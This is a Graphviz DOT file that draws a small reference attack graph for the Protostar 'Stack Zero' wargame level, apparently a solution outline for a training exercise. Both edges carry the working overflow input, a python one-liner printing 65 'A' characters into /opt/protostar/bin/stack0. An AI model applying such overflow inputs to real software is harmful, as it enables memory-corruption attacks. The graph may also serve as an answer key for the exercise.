digraph AttackGraph {
  rankdir=LR;
  graph [fontsize=12, labelloc="t", label="Attack Graph (reference) - Protostar Stack Zero"];
  node [shape=box, style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica"];
  edge [color="#555555", fontname="Helvetica", fontsize=10];

  start [shape="box", style="rounded,filled", fillcolor="#EAF3FF", color="#444444", fontname="Helvetica", label="Start"];
  node0 [shape="box", style="rounded,filled", fillcolor="#F7F7F7", color="#444444", fontname="Helvetica", label="Overflow length identified"];
  node1 [shape="box", style="rounded,filled", fillcolor="#E8FFE8", color="#2E7D32", fontname="Helvetica", penwidth="2", label="modified variable overwritten"];

  start -> node0 [color="#555555", fontname="Helvetica", fontsize="10", label="python -c 'print \"A\"*65' | /opt/protostar/bin/stack0"];
  node0 -> node1 [color="#555555", fontname="Helvetica", fontsize="10", label="python -c 'print \"A\"*65' | /opt/protostar/bin/stack0"];
}
